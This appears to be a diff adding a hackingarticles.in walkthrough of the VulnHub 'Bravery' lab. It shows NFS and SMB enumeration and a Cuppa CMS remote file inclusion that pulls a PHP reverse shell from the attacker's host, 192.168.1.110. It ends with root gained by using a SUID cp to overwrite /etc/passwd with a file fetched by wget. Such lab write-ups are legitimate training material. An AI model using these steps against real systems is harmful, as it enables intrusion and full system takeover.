@@ -1,0 +1,113 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">digitalworld.local-BRAVERY: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/digitalworld-local-bravery-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-05-25T02:54:04+00:00">May 25, 2019</time><time class="updated" datetime="2025-06-10T20:11:39+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we will be solving a boot2root lab from Vulnhub called Bravery. This lab, like many others, is a good way to keep your penetration testing skills sharp while getting some variety.</span></p>
+<p><span style="color: #000000;">Download it from here: <a style="color: #000000;" href="https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/">https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/</a></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Penetration Methodologies</span> </strong></span></h3>
+<p><span style="color: #000000;"><strong>Scanning </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Mount NFS share directory</span></li>
+<li><span style="color: #000000;">SMB shared file enumeration</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing CMS via RFI</span></li>
+<li><span style="color: #000000;">Obtaining reverse shell via netcat</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing SUID binary</span></li>
+<li><span style="color: #000000;">Capture the Flag</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong><u>Walkthrough </u></strong></span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<p><span style="color: #000000;">Let’s start with network scanning to identify the IP of VM with the help of netdiscover.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-QFjaD31iZpE/XOirOo7P-6I/AAAAAAAAefU/srilGRkxI9A40Qfaj_-lOxXVJWEtM3SbgCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">So we have our target IP 192.168.1.105 now, let’s scan services and ports via nmap.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.105</pre>
+<p><span style="color: #000000;">We got a fruitful result from nmap scan as we saw so many services were running on the various port.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-2t0RkdLk8iU/XOirQ8zRNlI/AAAAAAAAefs/z-iy7_4ddSc0W1Cm49jr-AY_bkVZWJJ-wCLcBGAs/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">We found network share service is available via port 2049, so we thought to check shared directory in the network. We have therefore installed NFS-client on our local machine and have a command to identify the shared directory available to mount on our local computer.</span></p>
+<pre class="lang:default decode:true">showmount -e 192.168.1.105</pre>
+<p><span style="color: #000000;">we found <em>/var/nfsshare</em> is a shared directory that we can mount in our local machine as given below:</span></p>
+<pre class="lang:default decode:true">mkdir /tmp/raj
+mount -t nfs 192.168.1.105:/var/nfsshare /tmp/raj
+cd /tmp/raj
+ls
+cat discovery
+cat enumeration
+cat explore
+cat password.txt
+cat qwertyuioplkjhgfdsazxcvbnm</pre>
+<p><span style="color: #000000;">Hmmm!!! After exploring all files, we concluded that “qwertyuioplkjhgfdsazxcvbnm” could be the password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Wco1qIx_W7A/XOirSZy9LTI/AAAAAAAAef8/9FC6GZ--0_0PxLJeVn9D8aFuQUdQMbthACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Because port 445 is also available for SMB, even we have also obtained a password recently thus we can try connecting to SMB to list shared folders. But first we need to enumerate SMB shared directory and for that, we can go with Enum4linux.</span></p>
+<pre class="lang:default decode:true">enum4linux 192.168.1.105</pre>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-vtR5gtPSiJE/XOirSi-H48I/AAAAAAAAegA/IW-bYgYehfoEmAxQSLDHSX8GwsBWfbiogCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">As you can observe, enum4linux showed two shared folders: <em>anonymous</em> and <em>secured</em>. And we can access them with the help of smb-client.</span></p>
+<pre class="lang:default decode:true">smbclient //192.168.1.105/anonymous
+password: qwertyuioplkjhgfdsazxcvbnm</pre>
+<p><span style="color: #000000;">We have successfully accessed the shared folder “anonymous”, where I have seen some user’s folders. But while doing an internal recon, I didn’t notice any interesting clues.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-2FyeVG5xuIc/XOirS1WpLQI/AAAAAAAAegE/Rpiwt7kqrNs_ffldmIOrs55nc-fJjwQIQCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">So, I’m moving to another “secured” folder and here I found three files, which I downloaded on my local computer.</span></p>
+<pre class="lang:default decode:true">smbclient //192.168.1.105/secured -U David
+password: qwertyuioplkjhgfdsazxcvbnm
+get david.txt
+get genevieve.txt
+get README.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-GfSM_jougjM/XOirTTIukeI/AAAAAAAAegI/TSgLYumXl20eLGDzNFERIQv5IIWFbjXowCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Then, each file opened, and some helpful URLs were found, we’re going to navigate them one by one, moreover, the last line was pitching for any CMS login.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-U0c8obuu1qo/XOirTkRtSBI/AAAAAAAAegM/RFDpS_TzdnMM8Sm-rCS2LMVPOL2K4MYIACLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Initially, we looked at the URL given below but that was no use to us.</span></p>
+<pre class="lang:default decode:true">//192.168.1.105/devlopmentsecretpage</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="//1.bp.blogspot.com/-I5yutfgGqwI/XOirT_YZGOI/AAAAAAAAegQ/ND0wn19iKG4VmAbC45cLfQrGulbq3S0-ACLcBGAs/s1600/8.1.png"/></strong></span></p>
+<p><span style="color: #000000;">We then explored another URL and found no useful stuff here, too.</span></p>
+<pre class="lang:default decode:true">//192.168.1.105/devops/directortestpagev1.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-nuBLoBQ0B04/XOirUj6c9HI/AAAAAAAAegU/zAulTXeop2EBUU4PCbLUXdqgQam7UH_lgCLcBGAs/s1600/8.2.png"/></span></p>
+<p><span style="color: #000000;">At last we move to the third and final URL found from the genevieve.txt. Fortunately, I found the following web page differing from two previous results and it could have been CMS.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-aRbgGzYDWks/XOirU-yOwDI/AAAAAAAAegY/6TkkI8_e5DIEGKnUE36ZEknDKDKvYYpFACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">I found a Cuppa CMS login page by exploring other tabs. This might be a turning point as we are attempting to exploit CMS cuppa.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-VBk5oKFCJy8/XOirVBZwSTI/AAAAAAAAegc/bRnI3JcggRE_XlkTrNE_pXb843bDpud_QCLcBGAs/s1600/9.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploiting</strong></span></h3>
+<p><span style="color: #000000;">I dig out cuppa exploit from inside the searchsploit without wasting time and the CMS is vulnerable to LFI/RFI.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-y575AhmIXWg/XOirOg9HyZI/AAAAAAAAefY/UGUlt_TgewoG1Vfj0bTgZsCdD7ylwj16ACLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Thus, I found a Remote Inclusion File URL when I checked the POC. We now have to be prepared with a reverse shell for the exploitation of RFI.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-xxZ_QIN3_ig/XOirPJ-t06I/AAAAAAAAefc/uTZQAKqyVxIdryC3kEJLNq39BnjZ-ENEQCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Therefore, I used php-reverse-shell from inside /usr/share/webshell/php and modified the listening IP with Kali’s IP then launch Python HTTP server for file transferring and start netcat listener on listening port.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Wn70mMjijRg/XOirPlMG-LI/AAAAAAAAefg/nG5BSle9RZMXThjKtCMHji_CAqII3CgGwCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">When everything is ready! Just trigger the following URL to exploit RFI.</span></p>
+<pre class="lang:default decode:true">//192.168.1.105/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=//192.168.1.110:8000/shell.php?</pre>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-nnUlXpjOsnE/XOirPhMXIkI/AAAAAAAAefk/HcDyals94jo9MTo83u_a_aBpsMRaU1cmwCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">We’ll get a netcat session for the victim’s machine as soon as we trigger the URL. Now we have a low privilege shell and we need to enhance privilege in order to achieve a higher privilege shell. Therefore, to find SUID enable binaries, I run the following command.</span></p>
+<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p><span style="color: #000000;">Hmmm! So here I notice cp (copy command) has SUID permission that means I can copy any file as root. Now let’s try to escalate the privilege by exploiting SUID enable binary by copying our edited /etc/passwd file inside the victim’s machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-7cr7nlJRYmI/XOirPwN-QGI/AAAAAAAAefo/16f6B3maifQxMKJQlM8Go75DQM7OZpJkwCLcBGAs/s1600/19.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">Suppose I would like to create a new user (raj) with root privilege inside /etc/password file of victim’s machine. So first we need to copy the content of /etc/passwd file in a text file inside our local machine and then with the help of OpenSSL generates the salt password for user raj and then copy the salt value.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-N_zszaoPsZg/XOirRVmxjuI/AAAAAAAAefw/_eppgQnlrW4YAmrdVooTHpaohf7fPhIegCLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">Now open the text file where you have pasted the content of /etc/passwd of victim’s machine and add a new row for user raj along with the salt value that we have generated. Named the file as passwd and transfer this file into victim machine, so that we can replace our /etc/passwd file with original /etc/passwd file of the VM.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-mZ4b_vEN1CQ/XOirRnUNDTI/AAAAAAAAef0/0zZ7Z2ewRjkL3-2gFOZxjZgHm6M-sY8CwCLcBGAs/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">For downloading /etc/passwd file into Victim’s machine, execute the following command and get the root access to grab the flag.</span></p>
+<pre class="lang:default decode:true">cd /tmp
+wget //192.168.1.110:8000/passwd
+cp passwd /etc/passwd
+su raj
+cd /root
+ls
+cat proof.txt</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="//1.bp.blogspot.com/-fDnhpV29qiE/XOirRxKuobI/AAAAAAAAef4/Ox30XVS5AlMvfDTuwVPqVtkU2kAs1wObACLcBGAs/s1600/22.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
